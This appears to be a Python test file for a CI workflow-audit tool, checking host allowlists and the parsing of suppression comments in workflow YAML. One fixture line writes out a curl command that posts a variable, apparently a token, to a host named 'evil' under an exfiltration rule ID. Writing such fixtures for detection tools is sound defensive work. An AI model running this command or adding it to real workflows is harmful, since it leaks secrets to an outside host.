# tests/test_workflow_allowlist.py
from credence.workflow_audit.allowlist import (
    is_platform_host, is_installer_host, parse_suppressions, Suppression,
)


def test_platform_hosts():
    assert is_platform_host("api.github.com") is True
    assert is_platform_host("ghcr.io") is True
    assert is_platform_host("evil.example") is False


def test_installer_hosts():
    assert is_installer_host("get.docker.com") is True
    assert is_installer_host("sh.rustup.rs") is True
    assert is_installer_host("evil.example") is False


def test_user_extra_hosts_extend_installer_set():
    assert is_installer_host("my.internal", extra_hosts={"my.internal"}) is True


def test_parse_suppressions_extracts_rule_line_reason():
    text = (
        "jobs:\n"
        "  a:\n"
        "    steps:\n"
        "      - run: curl -d \"$T\" evil  # credence:ignore WF-EXFIL-001 reason=build relay\n"
    )
    sup = parse_suppressions(text)
    assert len(sup) == 1
    assert sup[0].rule_id == "WF-EXFIL-001"
    assert sup[0].reason == "build relay"
    assert sup[0].line == 4


def test_parse_suppressions_ignores_unrelated_comments():
    assert parse_suppressions("run: echo hi  # just a note") == []
